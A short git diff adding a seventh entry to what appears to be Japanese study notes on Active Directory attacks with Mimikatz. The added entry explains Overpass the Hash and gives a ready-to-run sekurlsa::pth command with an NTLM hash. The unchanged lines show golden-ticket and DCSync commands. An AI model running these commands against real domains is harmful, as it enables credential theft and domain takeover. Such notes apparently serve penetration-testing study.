@@ -32,3 +32,9 @@ kerberos::golden /sid:<sid> /domain:corp.com /ptt /target:web04.corp.com /servic
 ```
 lsadump::dcsync /user:corp\dave
 ```
+
+7. Pass the HashではなくOverpass the Hash攻撃。ターゲットユーザのNTLMハッシュを使ってpowershellを起動する。  
+PtHとの違いとして、Kerberosを使って認証している点がある。
+```
+sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+```
